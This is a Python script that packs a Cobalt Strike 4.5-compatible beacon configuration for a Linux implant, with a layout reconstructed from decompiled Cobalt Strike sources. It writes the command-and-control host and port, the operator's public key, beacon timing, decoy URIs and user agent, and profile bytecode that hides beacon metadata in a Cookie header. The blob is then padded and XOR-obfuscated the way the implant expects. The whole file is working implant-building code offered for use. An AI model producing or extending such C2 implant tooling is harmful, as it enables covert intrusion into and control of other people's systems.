#!/usr/bin/env python3
"""
Pack a Cobalt Strike 4.5-compatible settings blob for LinuxBeacon.

Wire format (from 4.5 decompiled Sources):
  beacon/Settings.java       — TLV: index:u16, type:u16, length:u16, value
  beacon/BeaconConstants.java — field IDs
  beacon/BeaconPayload.java  — exportBeaconStage / setupHTTP / beacon_obfuscate
  common/Packer.java         — big-endian ints/shorts; string pad with zeros

Flow:
  Settings.toPatch(4096)  → TLV + short(0) + random padding to 4096
  beacon_obfuscate()      → each byte ^= 0x2E (46)

Fixed field sizes used by setupHTTP / exportBeaconStage:
  PUBKEY        256
  DOMAINS       256   (host,uri,host,uri,... comma-separated)
  USERAGENT     256
  SUBMITURI      64
  C2_RECOVER    256
  C2_REQUEST    512
  C2_POSTREQ    512
  VERB_GET/POST  16
"""
from __future__ import annotations

import argparse
import os
import struct
import sys
from pathlib import Path

TYPE_SHORT = 1
TYPE_INT = 2
TYPE_PTR = 3
PATCH = 4096
XOR_KEY = 0x2E

# IDs — beacon/BeaconConstants.java
SETTING_PROTOCOL = 1
SETTING_PORT = 2
SETTING_SLEEPTIME = 3
SETTING_MAXGET = 4
SETTING_JITTER = 5
SETTING_PUBKEY = 7
SETTING_DOMAINS = 8
SETTING_USERAGENT = 9
SETTING_SUBMITURI = 10
SETTING_C2_RECOVER = 11
SETTING_C2_REQUEST = 12
SETTING_C2_POSTREQ = 13
SETTING_C2_VERB_GET = 26
SETTING_C2_VERB_POST = 27
SETTING_C2_CHUNK_POST = 28
SETTING_CRYPTO_SCHEME = 31
SETTING_WATERMARK = 37
SETTING_HTTP_NO_COOKIES = 50
SETTING_HOST_HEADER = 54
SETTING_DOMAIN_STRATEGY = 67
SETTING_DOMAIN_STRATEGY_SECONDS = 68
SETTING_DOMAIN_STRATEGY_FAIL_X = 69
SETTING_DOMAIN_STRATEGY_FAIL_SECONDS = 70
SETTING_MAX_RETRY_STRATEGY_ATTEMPTS = 71
SETTING_MAX_RETRY_STRATEGY_INCREASE = 72
SETTING_MAX_RETRY_STRATEGY_DURATION = 73

DEFAULT_UA = (
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
)


def be_u16(x: int) -> bytes:
    return struct.pack(">H", x & 0xFFFF)


def be_u32(x: int) -> bytes:
    return struct.pack(">I", x & 0xFFFFFFFF)


def pad_bytes(data: bytes, size: int) -> bytes:
    """Packer.addString: write data then zero-pad to size."""
    if len(data) > size:
        return data[:size]
    return data + b"\x00" * (size - len(data))


def tlv_short(idx: int, val: int) -> bytes:
    return be_u16(idx) + be_u16(TYPE_SHORT) + be_u16(2) + be_u16(val)


def tlv_int(idx: int, val: int) -> bytes:
    return be_u16(idx) + be_u16(TYPE_INT) + be_u16(4) + be_u32(val)


def tlv_data(idx: int, data: bytes, fixed_len: int) -> bytes:
    """addData(id, bytes, fixed_len) — length field is fixed_len, value zero-padded."""
    payload = pad_bytes(data, fixed_len)
    return be_u16(idx) + be_u16(TYPE_PTR) + be_u16(fixed_len) + payload


def tlv_string(idx: int, s: str, fixed_len: int) -> bytes:
    return tlv_data(idx, s.encode("utf-8"), fixed_len)


def default_profile_programs() -> tuple[bytes, bytes, bytes]:
    """
    Minimal bytecode programs matching default.profile behavior enough for P0.

    Official default:
      http-get.client:  metadata -> base64 -> header Cookie
      http-post.client: id -> parameter id= ; output -> print
      http-get.server.output: print (identity recover often empty / print)

    Beacon profile.cpp opcodes (same IDs as c2profile/Program.java):
      1 APPEND  2 PREPEND  3 BASE64  4 PRINT  5 PARAMETER  6 HEADER
      7 BUILD   8 NETBIOS  9 !PARAMETER  10 !HEADER  11 NETBIOSU
      12 URI_APPEND  13 BASE64URL  15 MASK  16 HOSTHEADER

    BUILD arg: 0 = metadata/id, 1 = output

    For P0 the implant uses a hardcoded default Cookie path when programs are
    empty/unknown; still embed valid-looking empty-terminated programs so
    settings_init loads fixed sizes like the real beacon.
    """
    # Empty / terminator-only: implant P0 ignores and uses default path.
    # Real programs will be produced by profile_compile (P2) from .profile.
    recover = b""  # identity recover
    # GET: BUILD metadata(0), BASE64, HEADER "Cookie"
    get_prog = (
        be_u32(7) + be_u32(0)  # BUILD metadata
        + be_u32(3)  # BASE64
        + be_u32(6) + be_u32(6) + b"Cookie"  # HEADER Cookie
    )
    # POST: BUILD id(0), PARAMETER "id" ; BUILD output(1), PRINT
    post_prog = (
        be_u32(7) + be_u32(0)
        + be_u32(5) + be_u32(2) + b"id"
        + be_u32(7) + be_u32(1)
        + be_u32(4)
    )
    return recover, get_prog, post_prog


def pack(
    host: str,
    port: int,
    https: int,
    pubkey: bytes,
    sleep_ms: int = 60000,
    jitter: int = 0,
    get_uri: str = "/en_US/all.js",
    post_uri: str = "/submit.php",
    ua: str = DEFAULT_UA,
    maxget: int = 1048576,
) -> bytes:
    # PROTOCOL: bit0 DNS, bit3 HTTPS (BeaconPayload.exportBeaconStage)
    proto = 0x08 if https else 0x00

    # DOMAINS: alternating host,uri pairs joined by comma (max 256)
    domains = f"{host},{get_uri}"

    recover, get_prog, post_prog = default_profile_programs()

    blob = bytearray()
    blob += tlv_short(SETTING_PROTOCOL, proto)
    blob += tlv_short(SETTING_PORT, port)
    blob += tlv_int(SETTING_SLEEPTIME, sleep_ms)
    blob += tlv_int(SETTING_MAXGET, maxget)
    blob += tlv_short(SETTING_JITTER, jitter)
    blob += tlv_data(SETTING_PUBKEY, pubkey, 256)
    blob += tlv_string(SETTING_DOMAINS, domains, 256)
    # strategy defaults (round-robin)
    blob += tlv_short(SETTING_DOMAIN_STRATEGY, 0)
    blob += tlv_int(SETTING_DOMAIN_STRATEGY_SECONDS, -1 & 0xFFFFFFFF)
    blob += tlv_int(SETTING_DOMAIN_STRATEGY_FAIL_X, -1 & 0xFFFFFFFF)
    blob += tlv_int(SETTING_DOMAIN_STRATEGY_FAIL_SECONDS, -1 & 0xFFFFFFFF)
    blob += tlv_short(SETTING_CRYPTO_SCHEME, 0)
    blob += tlv_string(SETTING_C2_VERB_GET, "GET", 16)
    blob += tlv_string(SETTING_C2_VERB_POST, "POST", 16)
    blob += tlv_int(SETTING_C2_CHUNK_POST, 0)
    blob += tlv_int(SETTING_WATERMARK, 0)
    blob += tlv_short(SETTING_HTTP_NO_COOKIES, 1)  # default profile uses Cookie
    blob += tlv_string(SETTING_HOST_HEADER, "", 128)
    blob += tlv_int(SETTING_MAX_RETRY_STRATEGY_ATTEMPTS, 0)
    blob += tlv_int(SETTING_MAX_RETRY_STRATEGY_INCREASE, 0)
    blob += tlv_int(SETTING_MAX_RETRY_STRATEGY_DURATION, 0)
    # HTTP profile programs (fixed sizes like setupHTTP)
    blob += tlv_string(SETTING_USERAGENT, ua, 256)
    blob += tlv_string(SETTING_SUBMITURI, post_uri, 64)
    blob += tlv_data(SETTING_C2_RECOVER, recover, 256)
    blob += tlv_data(SETTING_C2_REQUEST, get_prog, 512)
    blob += tlv_data(SETTING_C2_POSTREQ, post_prog, 512)

    blob += be_u16(0)  # end marker

    if len(blob) > PATCH:
        raise SystemExit(f"settings too large: {len(blob)} > {PATCH}")

    # Settings.toPatch: pad remainder with random bytes (we use os.urandom)
    pad_len = PATCH - len(blob)
    raw = bytes(blob) + os.urandom(pad_len)

    # beacon_obfuscate: XOR 0x2E
    return bytes(b ^ XOR_KEY for b in raw)


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--https", type=int, choices=(0, 1), default=0)
    ap.add_argument("--pubkey", required=True, help="DER public key (any len; padded to 256)")
    ap.add_argument("--out", required=True)
    ap.add_argument("--sleep", type=int, default=60000)
    ap.add_argument("--jitter", type=int, default=0)
    ap.add_argument("--get-uri", default="/en_US/all.js")
    ap.add_argument("--post-uri", default="/submit.php")
    ap.add_argument("--ua", default=DEFAULT_UA)
    args = ap.parse_args()

    pubkey = Path(args.pubkey).read_bytes()
    data = pack(
        args.host,
        args.port,
        args.https,
        pubkey,
        sleep_ms=args.sleep,
        jitter=args.jitter,
        get_uri=args.get_uri,
        post_uri=args.post_uri,
        ua=args.ua,
    )
    Path(args.out).write_bytes(data)
    print(f"wrote {args.out} ({len(data)} bytes, XOR-masked, CS4.5 layout)")


if __name__ == "__main__":
    main()
